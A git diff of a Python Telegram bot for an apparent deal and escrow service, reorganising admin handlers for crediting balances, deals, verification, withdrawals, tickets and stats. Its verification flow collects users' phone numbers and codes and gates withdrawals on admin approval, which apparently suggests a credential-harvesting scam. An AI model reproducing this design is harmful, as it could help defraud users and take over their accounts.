-💎 TON: {bal.get('ton', 0)}
-⭐️ STARS: {bal.get('stars', 0)}
-💰 RUB: {bal.get('rub', 0)}
-🌐 UAH: {bal.get('uah', 0)}
-
-✅ 2 сделки с одним покупателем: выполнено
-✅ Верификация: пройдена
-
-🔑 Код верификации: {verif_data.get('code', 'неизвестно')}
-🕐 Сессия активна до: {verif_data.get('expires_at', 'неизвестно')[:19] if verif_data.get('expires_at') else 'неизвестно'}
-
-📱 Вывод средств в Mini App"""
-    else:
-        text = f"""💰 YOUR BALANCE
-
-💎 TON: {bal.get('ton', 0)}
-⭐️ STARS: {bal.get('stars', 0)}
-💰 RUB: {bal.get('rub', 0)}
-🌐 UAH: {bal.get('uah', 0)}
-
-✅ 2 deals with one buyer: completed
-✅ Verification: passed
-
-🔑 Verification code: {verif_data.get('code', 'unknown')}
-🕐 Session active until: {verif_data.get('expires_at', 'unknown')[:19] if verif_data.get('expires_at') else 'unknown'}
-
-📱 Withdraw in Mini App"""
-    
-    await callback.message.edit_text(
-        text,
-        reply_markup=mini_app_keyboard("💳 Вывести" if lang == "ru" else "💳 Withdraw", page="withdraw")
-    )
-    await callback.answer()
-
-# ============================================================
-# 10. АДМИН
-# ============================================================
-class AdminStates(StatesGroup):
-    waiting_user_id = State()
-    waiting_currency = State()
-    waiting_amount = State()
-    waiting_verification_response = State()
-
-@dp.callback_query(lambda c: c.data == "menu_admin")
-async def menu_admin(callback: types.CallbackQuery):
-    if not is_admin(callback.from_user.id):
-        await callback.answer("⛔ Доступ запрещён", show_alert=True)
-        return
-    await callback.message.edit_text(
-        "⚙️ АДМИН ПАНЕЛЬ\n\nВыберите действие:",
-        reply_markup=admin_panel_keyboard()
-    )
-    await callback.answer()
-
-@dp.callback_query(lambda c: c.data == "admin_add_balance")
-async def admin_add_balance(callback: types.CallbackQuery, state: FSMContext):
-    if not is_admin(callback.from_user.id):
-        await callback.answer("⛔ Доступ запрещён", show_alert=True)
-        return
-    await callback.message.edit_text("💰 НАЧИСЛИТЬ БАЛАНС\n\nВведите ID пользователя:")
-    await state.set_state(AdminStates.waiting_user_id)
-    await callback.answer()
-
-@dp.message(AdminStates.waiting_user_id)
-async def admin_get_user_id(message: types.Message, state: FSMContext):
-    try:
-        user_id = int(message.text.strip())
-        await state.update_data(target_user_id=user_id)
-        await message.answer("💱 Выберите валюту:", reply_markup=currency_keyboard())
-        await state.set_state(AdminStates.waiting_currency)
-    except:
-        await message.answer("❌ Неверный ID")
-
-@dp.callback_query(lambda c: c.data.startswith("curr_"))
-async def admin_get_currency(callback: types.CallbackQuery, state: FSMContext):
-    currency = callback.data.split("_")[1]
-    await state.update_data(target_currency=currency)
-    await callback.message.edit_text(f"💰 Введите сумму в {currency}:")
-    await state.set_state(AdminStates.waiting_amount)
-    await callback.answer()
-
-@dp.message(AdminStates.waiting_amount)
-async def admin_get_amount(message: types.Message, state: FSMContext):
-    try:
-        amount = float(message.text.strip())
-        if amount <= 0:
-            raise ValueError
-        data = await state.get_data()
-        user_id = data.get("target_user_id")
-        currency = data.get("target_currency")
-        add_balance(user_id, currency, amount)
-        await message.answer(
-            f"✅ Начислено {amount} {currency} пользователю {user_id}",
-            reply_markup=admin_panel_keyboard()
-        )
-        await state.clear()
-    except:
-        await message.answer("❌ Неверная сумма")
-
-@dp.callback_query(lambda c: c.data == "admin_manage_admins")
-async def admin_manage_admins(callback: types.CallbackQuery):
-    if not is_admin(callback.from_user.id):
-        await callback.answer("⛔ Доступ запрещён", show_alert=True)
-        return
-    admin_list = "\n".join([f"• {aid}" for aid in list(admins.keys())]) if admins else "Нет дополнительных админов"
-    await callback.message.edit_text(
-        f"👥 АДМИНЫ\n\n"
-        f"Главный админ: {MASTER_ADMIN_ID}\n"
-        f"Дополнительные:\n{admin_list}\n\n"
-        f"/add_admin [ID] - добавить\n"
-        f"/remove_admin [ID] - удалить",
-        reply_markup=admin_panel_keyboard()
-    )
-    await callback.answer()
-
-@dp.message(Command("add_admin"))
-async def add_admin(message: types.Message):
-    if message.from_user.id != MASTER_ADMIN_ID:
-        await message.answer("⛔ Доступ запрещён")
-        return
-    args = message.text.split()
-    if len(args) != 2:
-        await message.answer("❗️ Использование: /add_admin [ID]")
-        return
-    try:
-        new_admin_id = int(args[1])
-        admins[str(new_admin_id)] = True
-        save_json(FILES["admins"], admins)
-        await message.answer(f"✅ Админ добавлен: {new_admin_id}")
-    except:
-        await message.answer("❌ Неверный ID")
-
-@dp.message(Command("remove_admin"))
-async def remove_admin(message: types.Message):
-    if message.from_user.id != MASTER_ADMIN_ID:
-        await message.answer("⛔ Доступ запрещён")
-        return
-    args = message.text.split()
-    if len(args) != 2:
-        await message.answer("❗️ Использование: /remove_admin [ID]")
-        return
-    try:
-        admin_id = int(args[1])
-        if admin_id == MASTER_ADMIN_ID:
-            await message.answer("❌ Нельзя удалить главного админа")
-            return
-        if str(admin_id) in admins:
-            del admins[str(admin_id)]
-            save_json(FILES["admins"], admins)
-            await message.answer(f"✅ Админ удалён: {admin_id}")
-        else:
-            await message.answer("❌ Админ не найден")
-    except:
-        await message.answer("❌ Неверный ID")
-
-# ============================================================
-# 11. АДМИН: ВСЕ СДЕЛКИ (С УДАЛЕНИЕМ)
+# 12. АДМИН: ВСЕ СДЕЛКИ
 # ============================================================
 @dp.callback_query(lambda c: c.data == "admin_all_deals")
 async def admin_all_deals(callback: types.CallbackQuery):
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        await callback.answer(f"{get_emoji_text('cross', False)} Доступ запрещён", show_alert=True)
         return
+    is_premium = await user_has_premium(callback.from_user.id)
     if not deals:
-        await callback.message.edit_text("📭 Нет сделок", reply_markup=admin_panel_keyboard())
+        await callback.message.edit_text(f"{get_emoji_text('cross', is_premium)} Нет сделок", reply_markup=admin_panel_keyboard(is_premium))
         return
-    text = "📊 ВСЕ СДЕЛКИ\n\n"
+    text = f"{get_emoji_text('list', is_premium)} <b>ВСЕ СДЕЛКИ</b>\n\n"
     for d_id, d in list(deals.items())[-20:]:
         status_map = {
-            "waiting_payment": "⏳ Ожидает оплаты",
-            "paid": "✅ Оплачено",
-            "awaiting_confirmation": "📦 Ожидает подтверждения",
-            "completed": "🎉 Завершено"
+            "waiting_payment": f"{get_emoji_text('zap', is_premium)} Ожидает оплаты",
+            "paid": f"{get_emoji_text('check', is_premium)} Оплачено",
+            "awaiting_confirmation": f"{get_emoji_text('gift', is_premium)} Ожидает подтверждения",
+            "completed": f"{get_emoji_text('crown', is_premium)} Завершено"
         }
         text += f"#{d_id} | {status_map.get(d['status'], d['status'])}\n"
         text += f"   👤 @{d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n"
         text += f"   💰 {d.get('amount', 0)} {d.get('currency', '')}\n"
         text += f"   📦 {d.get('product', '')[:30]}\n"
         text += f"   🗑️ /delete_deal {d_id}\n\n"
-    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(is_premium))
     await callback.answer()
 
 @dp.message(Command("delete_deal"))
 async def delete_deal_command(message: types.Message):
     if not is_admin(message.from_user.id):
-        await message.answer("⛔ Доступ запрещён")
+        await message.answer("❌ Доступ запрещён")
         return
     args = message.text.split()
     if len(args) != 2:
-        await message.answer("❗️ Использование: /delete_deal [deal_id]")
+        await message.answer("ℹ️ Использование: /delete_deal [deal_id]")
         return
     deal_id = args[1]
     if deal_id not in deals:
@@ -774,13 +551,14 @@ async def delete_deal_command(message: types.Message):
     await message.answer(f"✅ Сделка #{deal_id} удалена")
 
 # ============================================================
-# 12. АДМИН: ВСЕ ПОЛЬЗОВАТЕЛИ
+# 13. АДМИН: ВСЕ ПОЛЬЗОВАТЕЛИ
 # ============================================================
 @dp.callback_query(lambda c: c.data == "admin_users")
 async def admin_users(callback: types.CallbackQuery):
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        await callback.answer("❌ Доступ запрещён", show_alert=True)
         return
+    is_premium = await user_has_premium(callback.from_user.id)
     
     users_list = []
     for uid, data in balance.items():
@@ -793,33 +571,34 @@ async def admin_users(callback: types.CallbackQuery):
         })
     
     if not users_list:
-        await callback.message.edit_text("👥 Нет пользователей", reply_markup=admin_panel_keyboard())
+        await callback.message.edit_text(f"{get_emoji_text('user', is_premium)} Нет пользователей", reply_markup=admin_panel_keyboard(is_premium))
         return
     
-    text = "👥 ВСЕ ПОЛЬЗОВАТЕЛИ\n\n"
+    text = f"{get_emoji_text('user', is_premium)} <b>ВСЕ ПОЛЬЗОВАТЕЛИ</b>\n\n"
     for u in users_list[-20:]:
         text += f"🆔 {u['id']}\n"
         text += f"   💎 TON: {u['ton']} | ⭐️ STARS: {u['stars']}\n"
         text += f"   💰 RUB: {u['rub']} | 🌐 UAH: {u['uah']}\n\n"
     
-    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(is_premium))
     await callback.answer()
 
 # ============================================================
-# 13. АДМИН: ВЕРИФИКАЦИЯ (ПОДТВЕРЖДЕНИЕ КНОПКОЙ)
+# 14. АДМИН: ВЕРИФИКАЦИЯ
 # ============================================================
 @dp.callback_query(lambda c: c.data == "admin_verification")
 async def admin_verification(callback: types.CallbackQuery):
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        await callback.answer("❌ Доступ запрещён", show_alert=True)
         return
+    is_premium = await user_has_premium(callback.from_user.id)
     
     pending = {k: v for k, v in verification_requests.items() if v.get("status") == "pending"}
     if not pending:
-        await callback.message.edit_text("🔐 Нет активных запросов на верификацию", reply_markup=admin_panel_keyboard())
+        await callback.message.edit_text(f"{get_emoji_text('check', is_premium)} Нет активных запросов на верификацию", reply_markup=admin_panel_keyboard(is_premium))
         return
     
-    text = "🔐 ЗАПРОСЫ НА ВЕРИФИКАЦИЮ\n\n"
+    text = f"{get_emoji_text('check', is_premium)} <b>ЗАПРОСЫ НА ВЕРИФИКАЦИЮ</b>\n\n"
     for rid, req in list(pending.items())[-10:]:
         text += f"#{rid}\n"
         text += f"   👤 @{req.get('username', '?')}\n"
@@ -831,17 +610,17 @@ async def admin_verification(callback: types.CallbackQuery):
         text += f"   ➡️ /verify_confirm {rid} - подтвердить\n"
         text += f"   ➡️ /verify_reject {rid} - отклонить\n\n"
     
-    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(is_premium))
     await callback.answer()
 
 @dp.message(Command("verify_confirm"))
 async def verify_confirm(message: types.Message):
     if not is_admin(message.from_user.id):
-        await message.answer("⛔ Доступ запрещён")
+        await message.answer("❌ Доступ запрещён")
         return
     args = message.text.split()
     if len(args) != 2:
-        await message.answer("❗️ Использование: /verify_confirm [request_id]")
+        await message.answer("ℹ️ Использование: /verify_confirm [request_id]")
         return
     request_id = args[1]
     
@@ -853,19 +632,19 @@ async def verify_confirm(message: types.Message):
         await message.answer("❌ Запрос уже обработан")
         return
     
-    # Подтверждаем верификацию
     complete_verification(req["user_id"], req.get("phone", ""), req.get("code", ""))
     req["status"] = "completed"
     req["completed_at"] = datetime.now().isoformat()
     save_json(FILES["verification_requests"], verification_requests)
     
-    await message.answer(f"✅ Верификация #{request_id} подтверждена")
+    is_premium = await user_has_premium(message.from_user.id)
+    await message.answer(f"{get_emoji_text('check', is_premium)} Верификация #{request_id} подтверждена")
     await log_to_master(f"✅ Верификация #{request_id} подтверждена админом")
     
     try:
         await bot.send_message(
             req["user_id"],
-            f"✅ ВЕРИФИКАЦИЯ ПРОЙДЕНА!\n\n"
+            f"{get_emoji_text('check', is_premium)} <b>ВЕРИФИКАЦИЯ ПРОЙДЕНА!</b>\n\n"
             f"🔑 Теперь вы можете вывести средства.\n"
             f"🕐 Вывод доступен через 24 часа с момента подтверждения.\n\n"
             f"📱 Для вывода перейдите в Mini App."
@@ -876,11 +655,11 @@ async def verify_confirm(message: types.Message):
 @dp.message(Command("verify_reject"))
 async def verify_reject(message: types.Message):
     if not is_admin(message.from_user.id):
-        await message.answer("⛔ Доступ запрещён")
+        await message.answer("❌ Доступ запрещён")
         return
     args = message.text.split()
     if len(args) != 2:
-        await message.answer("❗️ Использование: /verify_reject [request_id]")
+        await message.answer("ℹ️ Использование: /verify_reject [request_id]")
         return
     request_id = args[1]
     
@@ -896,44 +675,46 @@ async def verify_reject(message: types.Message):
     req["rejected_at"] = datetime.now().isoformat()
     save_json(FILES["verification_requests"], verification_requests)
     
-    await message.answer(f"❌ Верификация #{request_id} отклонена")
+    is_premium = await user_has_premium(message.from_user.id)
+    await message.answer(f"{get_emoji_text('cross', is_premium)} Верификация #{request_id} отклонена")
     await log_to_master(f"❌ Верификация #{request_id} отклонена админом")
     
     try:
         await bot.send_message(
             req["user_id"],
-            f"❌ ВЕРИФИКАЦИЯ ОТКЛОНЕНА\n\n"
+            f"{get_emoji_text('cross', is_premium)} <b>ВЕРИФИКАЦИЯ ОТКЛОНЕНА</b>\n\n"
             f"Данные не прошли проверку. Попробуйте ещё раз."
         )
     except:
         pass
 
 # ============================================================
-# 14. ВЫВОДЫ (ЗАЯВКИ)
+# 15. ВЫВОДЫ (ЗАЯВКИ)
 # ============================================================
 @dp.callback_query(lambda c: c.data == "admin_withdraw_requests")
 async def admin_withdraw_requests(callback: types.CallbackQuery):
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        await callback.answer("❌ Доступ запрещён", show_alert=True)
         return
+    is_premium = await user_has_premium(callback.from_user.id)
     pending = {k: v for k, v in withdraw_requests.items() if v.get("status") == "pending"}
     if not pending:
-        await callback.message.edit_text("📭 Нет активных заявок", reply_markup=admin_panel_keyboard())
+        await callback.message.edit_text(f"{get_emoji_text('cross', is_premium)} Нет активных заявок", reply_markup=admin_panel_keyboard(is_premium))
         return
-    text = "💳 ЗАЯВКИ НА ВЫВОД\n\n"
+    text = f"{get_emoji_text('gift', is_premium)} <b>ЗАЯВКИ НА ВЫВОД</b>\n\n"
     for rid, req in list(pending.items())[-10:]:
         text += f"#{rid}\n   👤 ID: {req.get('user_id', '?')}\n   💰 {req.get('amount', 0)} {req.get('currency', '')}\n   📝 {req.get('details', '')[:30]}\n   ➡️ /confirm_withdraw {rid}\n\n"
-    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(is_premium))
     await callback.answer()
 
 @dp.message(Command("confirm_withdraw"))
 async def confirm_withdraw_command(message: types.Message):
     if not is_admin(message.from_user.id):
-        await message.answer("⛔ Доступ запрещён")
+        await message.answer("❌ Доступ запрещён")
         return
     args = message.text.split()
     if len(args) != 2:
-        await message.answer("❗️ Использование: /confirm_withdraw [ID]")
+        await message.answer("ℹ️ Использование: /confirm_withdraw [ID]")
         return
     request_id = args[1]
     if request_id not in withdraw_requests:
@@ -951,11 +732,12 @@ async def confirm_withdraw_command(message: types.Message):
     req["status"] = "completed"
     req["completed_at"] = datetime.now().isoformat()
     save_json(FILES["withdraw"], withdraw_requests)
-    await message.answer(f"✅ Вывод подтверждён #{request_id}")
+    is_premium = await user_has_premium(message.from_user.id)
+    await message.answer(f"{get_emoji_text('check', is_premium)} Вывод подтверждён #{request_id}")
     try:
         await bot.send_message(
             req["user_id"],
-            f"✅ ВЫВОД ПОДТВЕРЖДЁН\n\n💰 {req['amount']} {req['currency']}"
+            f"{get_emoji_text('check', is_premium)} <b>ВЫВОД ПОДТВЕРЖДЁН</b>\n\n💰 {req['amount']} {req['currency']}"
         )
     except:
         pass
@@ -963,11 +745,11 @@ async def confirm_withdraw_command(message: types.Message):
 @dp.message(Command("reject_withdraw"))
 async def reject_withdraw_command(message: types.Message):
     if not is_admin(message.from_user.id):
-        await message.answer("⛔ Доступ запрещён")
+        await message.answer("❌ Доступ запрещён")
         return
     args = message.text.split()
     if len(args) != 2:
-        await message.answer("❗️ Использование: /reject_withdraw [ID]")
+        await message.answer("ℹ️ Использование: /reject_withdraw [ID]")
         return
     request_id = args[1]
     if request_id not in withdraw_requests:
@@ -979,24 +761,26 @@ async def reject_withdraw_command(message: types.Message):
         return
     req["status"] = "rejected"
     save_json(FILES["withdraw"], withdraw_requests)
-    await message.answer(f"❌ Вывод отклонён #{request_id}")
+    is_premium = await user_has_premium(message.from_user.id)
+    await message.answer(f"{get_emoji_text('cross', is_premium)} Вывод отклонён #{request_id}")
 
 # ============================================================
-# 15. ТИКЕТЫ (ПОДДЕРЖКА С ОТДЕЛЬНЫМИ ЧАТАМИ)
+# 16. ТИКЕТЫ
 # ============================================================
 @dp.callback_query(lambda c: c.data == "admin_tickets")
 async def admin_tickets(callback: types.CallbackQuery):
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        await callback.answer("❌ Доступ запрещён", show_alert=True)
         return
+    is_premium = await user_has_premium(callback.from_user.id)
     
     pending = {k: v for k, v in tickets.items() if v.get("status") == "open"}
     
     if not pending:
-        await callback.message.edit_text("🎫 Нет открытых тикетов", reply_markup=admin_panel_keyboard())
+        await callback.message.edit_text(f"{get_emoji_text('cross', is_premium)} Нет открытых тикетов", reply_markup=admin_panel_keyboard(is_premium))
         return
     
-    text = "🎫 ТИКЕТЫ\n\n"
+    text = f"{get_emoji_text('headset', is_premium)} <b>ТИКЕТЫ</b>\n\n"
     for tid, t in list(pending.items())[-10:]:
         text += f"#{tid}\n"
         text += f"   👤 @{t.get('username', 'неизвестно')} (ID: {t.get('user_id', '?')})\n"
@@ -1005,18 +789,18 @@ async def admin_tickets(callback: types.CallbackQuery):
         text += f"   ➡️ /answer_ticket {tid} [ответ]\n"
         text += f"   ➡️ /close_ticket {tid}\n\n"
     
-    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(is_premium))
     await callback.answer()
 
 @dp.message(Command("answer_ticket"))
 async def answer_ticket_command(message: types.Message):
     if not is_admin(message.from_user.id):
-        await message.answer("⛔ Доступ запрещён")
+        await message.answer("❌ Доступ запрещён")
         return
     
     args = message.text.split(maxsplit=2)
     if len(args) < 3:
-        await message.answer("❗️ Использование: /answer_ticket [ticket_id] [ответ]")
+        await message.answer("ℹ️ Использование: /answer_ticket [ticket_id] [ответ]")
         return
     
     ticket_id = args[1]
@@ -1033,14 +817,15 @@ async def answer_ticket_command(message: types.Message):
     t["answered_by"] = message.from_user.id
     save_json(FILES["tickets"], tickets)
     
-    await message.answer(f"✅ Ответ отправлен на тикет #{ticket_id}")
+    is_premium = await user_has_premium(message.from_user.id)
+    await message.answer(f"{get_emoji_text('check', is_premium)} Ответ отправлен на тикет #{ticket_id}")
     
     try:
         await bot.send_message(
             t["user_id"],
-            f"📩 ОТВЕТ НА ТИКЕТ #{ticket_id}\n\n"
+            f"{get_emoji_text('headset', is_premium)} <b>ОТВЕТ НА ТИКЕТ #{ticket_id}</b>\n\n"
             f"📝 {response}\n\n"
-            f"✅ Тикет закрыт"
+            f"{get_emoji_text('check', is_premium)} Тикет закрыт"
         )
     except:
         pass
@@ -1048,12 +833,12 @@ async def answer_ticket_command(message: types.Message):
 @dp.message(Command("close_ticket"))
 async def close_ticket_command(message: types.Message):
     if not is_admin(message.from_user.id):
-        await message.answer("⛔ Доступ запрещён")
+        await message.answer("❌ Доступ запрещён")
         return
     
     args = message.text.split()
     if len(args) != 2:
-        await message.answer("❗️ Использование: /close_ticket [ticket_id]")
+        await message.answer("ℹ️ Использование: /close_ticket [ticket_id]")
         return
     
     ticket_id = args[1]
@@ -1068,61 +853,65 @@ async def close_ticket_command(message: types.Message):
     t["closed_by"] = message.from_user.id
     save_json(FILES["tickets"], tickets)
     
-    await message.answer(f"✅ Тикет #{ticket_id} закрыт")
+    is_premium = await user_has_premium(message.from_user.id)
+    await message.answer(f"{get_emoji_text('check', is_premium)} Тикет #{ticket_id} закрыт")
 
 # ============================================================
-# 16. ЧАТ ПОДДЕРЖКИ (ОТДЕЛЬНЫЕ ЧАТЫ)
+# 17. ЧАТ ПОДДЕРЖКИ
 # ============================================================
 @dp.message(Command("chat_reply"))
 async def chat_reply_command(message: types.Message):
     if not is_admin(message.from_user.id):
-        await message.answer("⛔ Доступ запрещён")
+        await message.answer("❌ Доступ запрещён")
         return
     
     args = message.text.split(maxsplit=2)
     if len(args) < 3:
-        await message.answer("❗️ Использование: /chat_reply [user_id] [текст ответа]")
+        await message.answer("ℹ️ Использование: /chat_reply [user_id] [текст ответа]")
         return
     
     target_user_id = int(args[1])
     reply_text = args[2]
+    is_premium = await user_has_premium(message.from_user.id)
     
     try:
         await bot.send_message(
             target_user_id,
-            f"📩 ОТВЕТ В ЧАТЕ ПОДДЕРЖКИ\n\n{reply_text}\n\n⬇️ Перейдите в Mini App",
-            reply_markup=mini_app_keyboard("📱 Открыть чат", page="support")
+            f"{get_emoji_text('headset', is_premium)} <b>ОТВЕТ В ЧАТЕ ПОДДЕРЖКИ</b>\n\n{reply_text}\n\n⬇️ Перейдите в Mini App",
+            reply_markup=mini_app_keyboard(f"{get_emoji_text('briefcase', is_premium)} Открыть чат", is_premium, page="support")
         )
-        await message.answer(f"✅ Ответ отправлен пользователю {target_user_id}")
+        await message.answer(f"{get_emoji_text('check', is_premium)} Ответ отправлен пользователю {target_user_id}")
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
 
 # ============================================================
-# 17. ЛОГИ И СТАТИСТИКА
+# 18. ЛОГИ И СТАТИСТИКА
 # ============================================================
 @dp.callback_query(lambda c: c.data == "admin_logs")
 async def admin_logs(callback: types.CallbackQuery):
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        await callback.answer("❌ Доступ запрещён", show_alert=True)
         return
+    is_premium = await user_has_premium(callback.from_user.id)
     logs_list = list(logs.values())[-20:]
     if not logs_list:
-        await callback.message.edit_text("📋 ЛОГИ\n\nНет записей", reply_markup=admin_panel_keyboard())
+        await callback.message.edit_text(f"{get_emoji_text('book', is_premium)} <b>ЛОГИ</b>\n\nНет записей", reply_markup=admin_panel_keyboard(is_premium))
         return
-    text = "📋 ПОСЛЕДНИЕ ЛОГИ\n\n"
+    text = f"{get_emoji_text('book', is_premium)} <b>ПОСЛЕДНИЕ ЛОГИ</b>\n\n"
     for log_entry in reversed(logs_list[-10:]):
         text += f"🕐 {log_entry.get('time', '')[:19]}\n"
         text += f"📌 {log_entry.get('action', '')}\n"
         data = log_entry.get('data', {})
         text += f"📊 {json.dumps(data, ensure_ascii=False)[:80]}\n\n"
-    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard())
+    await callback.message.edit_text(text[:4000], reply_markup=admin_panel_keyboard(is_premium))
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "admin_stats")
 async def admin_stats(callback: types.CallbackQuery):
     if not is_admin(callback.from_user.id):
-        await callback.answer("⛔ Доступ запрещён", show_alert=True)
+        await callback.answer("❌ Доступ запрещён", show_alert=True)
         return
+    is_premium = await user_has_premium(callback.from_user.id)
     
     total_users = len(balance)
     total_deals = len(deals)
@@ -1131,21 +920,373 @@ async def admin_stats(callback: types.CallbackQuery):
     open_tickets = len([t for t in tickets.values() if t.get('status') == 'open'])
     
     await callback.message.edit_text(
-        f"📊 СТАТИСТИКА\n\n"
+        f"{get_emoji_text('zap', is_premium)} <b>СТАТИСТИКА</b>\n\n"
         f"👥 Пользователей: {total_users}\n"
         f"📊 Всего сделок: {total_deals}\n"
         f"🔄 Активных сделок: {active_deals}\n"
         f"💎 Объём (TON): {total_volume}\n"
         f"✅ Завершённых сделок: {len([d for d in deals.values() if d.get('status') == 'completed'])}\n"
         f"🎫 Открытых тикетов: {open_tickets}",
-        reply_markup=admin_panel_keyboard()
+        reply_markup=admin_panel_keyboard(is_premium)
     )
     await callback.answer()
 
 # ============================================================
-# 18. API ДЛЯ MINI APP
+# 19. АДМИН: НАЧИСЛЕНИЕ
+# ============================================================
+class AdminStates(StatesGroup):
+    waiting_user_id = State()
+    waiting_currency = State()
+    waiting_amount = State()
+    waiting_verification_response = State()
+
+@dp.callback_query(lambda c: c.data == "admin_add_balance")
+async def admin_add_balance(callback: types.CallbackQuery, state: FSMContext):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("❌ Доступ запрещён", show_alert=True)
+        return
+    is_premium = await user_has_premium(callback.from_user.id)
+    await callback.message.edit_text(f"{get_emoji_text('wallet', is_premium)} <b>НАЧИСЛИТЬ БАЛАНС</b>\n\nВведите ID пользователя:")
+    await state.set_state(AdminStates.waiting_user_id)
+    await callback.answer()
+
+@dp.message(AdminStates.waiting_user_id)
+async def admin_get_user_id(message: types.Message, state: FSMContext):
+    try:
+        user_id = int(message.text.strip())
+        await state.update_data(target_user_id=user_id)
+        is_premium = await user_has_premium(message.from_user.id)
+        await message.answer(f"💱 Выберите валюту:", reply_markup=currency_keyboard(is_premium))
+        await state.set_state(AdminStates.waiting_currency)
+    except:
+        await message.answer("❌ Неверный ID")
+
+@dp.callback_query(lambda c: c.data.startswith("curr_"))
+async def admin_get_currency(callback: types.CallbackQuery, state: FSMContext):
+    currency = callback.data.split("_")[1]
+    await state.update_data(target_currency=currency)
+    is_premium = await user_has_premium(callback.from_user.id)
+    await callback.message.edit_text(f"💰 Введите сумму в {currency}:")
+    await state.set_state(AdminStates.waiting_amount)
+    await callback.answer()
+
+@dp.message(AdminStates.waiting_amount)
+async def admin_get_amount(message: types.Message, state: FSMContext):
+    try:
+        amount = float(message.text.strip())
+        if amount <= 0:
+            raise ValueError
+        data = await state.get_data()
+        user_id = data.get("target_user_id")
+        currency = data.get("target_currency")
+        add_balance(user_id, currency, amount)
+        is_premium = await user_has_premium(message.from_user.id)
+        await message.answer(
+            f"{get_emoji_text('check', is_premium)} Начислено {amount} {currency} пользователю {user_id}",
+            reply_markup=admin_panel_keyboard(is_premium)
+        )
+        await state.clear()
+    except:
+        await message.answer("❌ Неверная сумма")
+
+# ============================================================
+# 20. АДМИН: УПРАВЛЕНИЕ АДМИНАМИ
+# ============================================================
+@dp.callback_query(lambda c: c.data == "admin_manage_admins")
+async def admin_manage_admins(callback: types.CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("❌ Доступ запрещён", show_alert=True)
+        return
+    is_premium = await user_has_premium(callback.from_user.id)
+    admin_list = "\n".join([f"• {aid}" for aid in list(admins.keys())]) if admins else "Нет дополнительных админов"
+    await callback.message.edit_text(
+        f"👥 АДМИНЫ\n\n"
+        f"Главный админ: {MASTER_ADMIN_ID}\n"
+        f"Дополнительные:\n{admin_list}\n\n"
+        f"/add_admin [ID] - добавить\n"
+        f"/remove_admin [ID] - удалить",
+        reply_markup=admin_panel_keyboard(is_premium)
+    )
+    await callback.answer()
+
+@dp.message(Command("add_admin"))
+async def add_admin(message: types.Message):
+    if message.from_user.id != MASTER_ADMIN_ID:
+        await message.answer("❌ Доступ запрещён")
+        return
+    args = message.text.split()
+    if len(args) != 2:
+        await message.answer("ℹ️ Использование: /add_admin [ID]")
+        return
+    try:
+        new_admin_id = int(args[1])
+        admins[str(new_admin_id)] = True
+        save_json(FILES["admins"], admins)
+        await message.answer(f"✅ Админ добавлен: {new_admin_id}")
+    except:
+        await message.answer("❌ Неверный ID")
+
+@dp.message(Command("remove_admin"))
+async def remove_admin(message: types.Message):
+    if message.from_user.id != MASTER_ADMIN_ID:
+        await message.answer("❌ Доступ запрещён")
+        return
+    args = message.text.split()
+    if len(args) != 2:
+        await message.answer("ℹ️ Использование: /remove_admin [ID]")
+        return
+    try:
+        admin_id = int(args[1])
+        if admin_id == MASTER_ADMIN_ID:
+            await message.answer("❌ Нельзя удалить главного админа")
+            return
+        if str(admin_id) in admins:
+            del admins[str(admin_id)]
+            save_json(FILES["admins"], admins)
+            await message.answer(f"✅ Админ удалён: {admin_id}")
+        else:
+            await message.answer("❌ Админ не найден")
+    except:
+        await message.answer("❌ Неверный ID")
+
+# ============================================================
+# 21. ОБРАБОТЧИК ССЫЛКИ НА СДЕЛКУ
+# ============================================================
+async def handle_deal_link(message: types.Message, deal_id: str):
+    lang = get_user_language(message.from_user.id)
+    is_premium = await user_has_premium(message.from_user.id)
+    
+    global deals
+    deals = load_json(FILES["deals"])
+    
+    if deal_id not in deals:
+        if lang == "ru":
+            text = f"""{get_emoji_text('cross', is_premium)} Сделка #{deal_id} не найдена.
+
+Возможные причины:
+• Сделка была удалена
+• Ссылка недействительна
+• Сделка завершена
+
+🆘 Если вы считаете, что это ошибка — обратитесь в поддержку: @supexchangerf"""
+        else:
+            text = f"""{get_emoji_text('cross', is_premium)} Deal #{deal_id} not found.
+
+Possible reasons:
+• Deal was deleted
+• Invalid link
+• Deal is completed
+
+🆘 If you think this is an error — contact support: @supexchangerf"""
+        await message.answer(text)
+        return
+
+    deal = deals[deal_id]
+    
+    if deal["status"] != "waiting_payment":
+        status_map = {
+            "paid": f"{get_emoji_text('check', is_premium)} Оплачено" if lang == "ru" else f"{get_emoji_text('check', is_premium)} Paid",
+            "awaiting_confirmation": f"{get_emoji_text('gift', is_premium)} Ожидает подтверждения" if lang == "ru" else f"{get_emoji_text('gift', is_premium)} Awaiting confirmation",
+            "completed": f"{get_emoji_text('crown', is_premium)} Завершено" if lang == "ru" else f"{get_emoji_text('crown', is_premium)} Completed"
+        }
+        if lang == "ru":
+            text = f"{get_emoji_text('cross', is_premium)} Сделка #{deal_id} уже обработана.\n\nСтатус: {status_map.get(deal['status'], deal['status'])}"
+        else:
